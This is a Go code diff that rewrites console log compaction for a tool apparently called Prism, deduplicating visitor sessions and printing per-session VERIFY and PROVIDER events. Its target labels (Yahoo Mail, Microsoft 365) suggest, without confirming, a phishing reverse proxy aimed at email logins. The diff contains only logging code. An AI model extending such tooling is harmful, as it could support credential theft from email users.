@@ -6,6 +6,7 @@ import (
 	"log"
 	"os"
 	"strings"
+	"sync"
 	"time"
 )
 
@@ -17,6 +18,24 @@ type consoleLogWriter struct {
 }
 
 const visitorLogDedupeWindow = 5 * time.Minute
+
+type visitorLogEntry struct {
+	SID      string
+	LastSeen time.Time
+}
+
+var compactConsoleState = struct {
+	sync.Mutex
+	pendingVerifyHost   string
+	pendingVerifyPrefix string
+	visitors            map[string]visitorLogEntry
+	sidByIndex          map[string]string
+	providerSeen        map[string]time.Time
+}{
+	visitors:     make(map[string]visitorLogEntry),
+	sidByIndex:   make(map[string]string),
+	providerSeen: make(map[string]time.Time),
+}
 
 func installCompactConsole() {
 	originalStdout := os.Stdout
@@ -49,12 +68,6 @@ func filterStdout(reader *os.File, dst io.Writer) {
 	buf := make([]byte, 0, 64*1024)
 	scanner.Buffer(buf, 1024*1024)
 
-	// This map affects console output only. Prism's real session creation and
-	// routing behavior are not changed. Multiple subdomain sessions generated
-	// by one browser during the same page load are collapsed into one visitor
-	// event using the existing UA+IP text from the original session log line.
-	seenVisitors := make(map[string]time.Time)
-
 	for scanner.Scan() {
 		line := strings.TrimSpace(scanner.Text())
 		if line == "" {
@@ -62,6 +75,7 @@ func filterStdout(reader *os.File, dst io.Writer) {
 		}
 
 		if strings.Contains(line, "New session:") {
+			index := fieldBetween(line, "[+] [", "] New session:")
 			rest := fieldAfter(line, "New session:")
 			id := ""
 			if fields := strings.Fields(rest); len(fields) > 0 {
@@ -69,31 +83,67 @@ func filterStdout(reader *os.File, dst io.Writer) {
 			}
 
 			// Everything after the generated session ID is the existing browser/IP
-			// signature. Use it only to prevent duplicate console messages.
+			// signature. This is used only to collapse duplicate console events.
 			visitorKey := strings.TrimSpace(rest)
 			if id != "" {
 				visitorKey = strings.TrimSpace(strings.TrimPrefix(visitorKey, id))
 			}
 
 			now := time.Now()
-			if visitorKey != "" {
-				if lastSeen, exists := seenVisitors[visitorKey]; exists && now.Sub(lastSeen) < visitorLogDedupeWindow {
-					continue
+			canonicalSID := id
+			isNewVisitor := true
+			verifyHost := ""
+			verifyPrefix := ""
+
+			compactConsoleState.Lock()
+
+			for key, entry := range compactConsoleState.visitors {
+				if now.Sub(entry.LastSeen) >= visitorLogDedupeWindow {
+					delete(compactConsoleState.visitors, key)
 				}
-				seenVisitors[visitorKey] = now
-
-				// Opportunistic cleanup keeps the logging-only map bounded.
-				for key, lastSeen := range seenVisitors {
-					if now.Sub(lastSeen) >= visitorLogDedupeWindow {
-						delete(seenVisitors, key)
-					}
 			}
+			for key, lastSeen := range compactConsoleState.providerSeen {
+				if now.Sub(lastSeen) >= visitorLogDedupeWindow {
+					delete(compactConsoleState.providerSeen, key)
+				}
 			}
 
-			out := now.Format("2006/01/02 15:04:05") + " 🟢 VISITOR   •  New"
-			if id != "" {
-				out += "  •  ID " + id
+			if visitorKey != "" {
+				if existing, exists := compactConsoleState.visitors[visitorKey]; exists && now.Sub(existing.LastSeen) < visitorLogDedupeWindow {
+					canonicalSID = existing.SID
+					existing.LastSeen = now
+					compactConsoleState.visitors[visitorKey] = existing
+					isNewVisitor = false
+				} else {
+					compactConsoleState.visitors[visitorKey] = visitorLogEntry{SID: canonicalSID, LastSeen: now}
+				}
 			}
+
+			if index != "" && canonicalSID != "" {
+				compactConsoleState.sidByIndex[index] = canonicalSID
+			}
+
+			if isNewVisitor && compactConsoleState.pendingVerifyHost != "" {
+				verifyHost = compactConsoleState.pendingVerifyHost
+				verifyPrefix = compactConsoleState.pendingVerifyPrefix
+				compactConsoleState.pendingVerifyHost = ""
+				compactConsoleState.pendingVerifyPrefix = ""
+			}
+
+			compactConsoleState.Unlock()
+
+			if !isNewVisitor {
+				continue
+			}
+
+			if verifyHost != "" && canonicalSID != "" {
+				if verifyPrefix == "" {
+					verifyPrefix = now.Format("2006/01/02 15:04:05") + " "
+				}
+				_, _ = io.WriteString(dst, verifyPrefix+"🔐 VERIFY    •  SID "+canonicalSID+"  •  "+verifyHost+"\n")
+			}
+
+			out := now.Format("2006/01/02 15:04:05") + " 🟢 VISITOR   •  SID " + canonicalSID + "  •  New"
 			_, _ = io.WriteString(dst, out+"\n")
 			continue
 		}
@@ -111,25 +161,53 @@ func filterStdout(reader *os.File, dst io.Writer) {
 }
 
 func compactLogLine(line string) (string, bool) {
-	// Convert verbose root-request debug messages into compact page events.
+	// Root request debug lines are used only as correlation hints. We delay the
+	// verification event until a session ID exists, and provider output comes
+	// from the indexed request trace below.
 	if strings.Contains(line, "Request reached Go!") {
 		host := fieldBetween(line, "Host: ", " | Path:")
 		path := fieldBetween(line, "Path: ", " | Method:")
 		method := strings.TrimSpace(fieldAfter(line, "Method: "))
 
 		if method == "GET" && (path == "/" || path == "/index.html") {
-			prefix := ""
-			if i := strings.Index(line, "["); i > 0 {
-				prefix = strings.TrimSpace(line[:i]) + " "
-			}
-
 			if strings.HasPrefix(strings.ToLower(host), "go.") {
-				return prefix + "🔐 VERIFY    •  " + host, true
+				compactConsoleState.Lock()
+				compactConsoleState.pendingVerifyHost = host
+				compactConsoleState.pendingVerifyPrefix = prefixBefore(line, "[🔍 DEBUG]")
+				compactConsoleState.Unlock()
 			}
-
-			return prefix + "📨 PROVIDER  •  " + providerDisplayName(host), true
 		}
 		return "", false
+	}
+
+	// The existing indexed request trace gives us the provider + internal
+	// session index. Convert only root GET navigations into one compact event.
+	if strings.Contains(line, "[>] [") {
+		index, host, ok := indexedRootGET(line)
+		if !ok || strings.HasPrefix(strings.ToLower(host), "go.") {
+			return "", false
+		}
+
+		provider := providerDisplayName(host)
+		prefix := prefixBefore(line, "[>] [")
+
+		compactConsoleState.Lock()
+		sid := compactConsoleState.sidByIndex[index]
+		if sid == "" {
+			compactConsoleState.Unlock()
+			return "", false
+		}
+
+		key := sid + "|" + provider
+		now := time.Now()
+		if lastSeen, exists := compactConsoleState.providerSeen[key]; exists && now.Sub(lastSeen) < visitorLogDedupeWindow {
+			compactConsoleState.Unlock()
+			return "", false
+		}
+		compactConsoleState.providerSeen[key] = now
+		compactConsoleState.Unlock()
+
+		return prefix + "📨 PROVIDER  •  SID " + sid + "  •  " + provider, true
 	}
 
 	lower := strings.ToLower(line)
@@ -152,6 +230,62 @@ func compactLogLine(line string) (string, bool) {
 	}
 
 	return "", false
+}
+
+func indexedRootGET(line string) (string, string, bool) {
+	marker := "[>] ["
+	i := strings.Index(line, marker)
+	if i < 0 {
+		return "", "", false
+	}
+
+	rest := line[i+len(marker):]
+	endIndex := strings.Index(rest, "]")
+	if endIndex < 0 {
+		return "", "", false
+	}
+	index := strings.TrimSpace(rest[:endIndex])
+	rest = strings.TrimSpace(rest[endIndex+1:])
+
+	// Skip the target label: [Yahoo Mail], [Microsoft 365], etc.
+	if !strings.HasPrefix(rest, "[") {
+		return "", "", false
+	}
+	endTarget := strings.Index(rest, "]")
+	if endTarget < 0 {
+		return "", "", false
+	}
+	rest = strings.TrimSpace(rest[endTarget+1:])
+
+	if !strings.HasPrefix(rest, "GET ") {
+		return "", "", false
+	}
+	rest = strings.TrimSpace(strings.TrimPrefix(rest, "GET "))
+	fields := strings.Fields(rest)
+	if len(fields) == 0 {
+		return "", "", false
+	}
+
+	hostPath := fields[0]
+	slash := strings.Index(hostPath, "/")
+	if slash < 0 {
+		return "", "", false
+	}
+	host := hostPath[:slash]
+	path := hostPath[slash:]
+	if path != "/" {
+		return "", "", false
+	}
+
+	return index, host, true
+}
+
+func prefixBefore(s, marker string) string {
+	i := strings.Index(s, marker)
+	if i <= 0 {
+		return ""
+	}
+	return strings.TrimSpace(s[:i]) + " "
 }
 
 func providerDisplayName(host string) string {
